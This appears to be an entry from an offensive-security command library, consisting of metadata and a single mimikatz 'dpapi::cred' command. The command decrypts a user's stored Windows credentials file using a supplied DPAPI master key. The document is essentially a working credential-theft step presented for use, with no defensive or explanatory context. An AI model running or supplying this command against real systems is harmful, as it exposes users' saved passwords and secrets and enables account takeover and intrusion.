---
id: 45005319-dc59-4709-8d84-552e38ccecda
name: Use Master Key to Decrypt Credentials
type: command
executor: bash
data: mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0
  /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
output: null
created_at: '2023-04-06T03:56:26.276426+00:00'
updated_at: '2023-04-10T20:37:13.305156+00:00'
---

# Use Master Key to Decrypt Credentials

```bash
mimikatz dpapi::cred /in:C:\Users\<username>\AppData\Local\Microsoft\Credentials\2647629F5AA74CD934ECD2F88D64ECD0 /masterkey:95664450d90eb2ce9a8b1933f823b90510b61374180ed5063043273940f50e728fe7871169c87a0bba5e0c470d91d21016311727bce2eff9c97445d444b6a17b
```
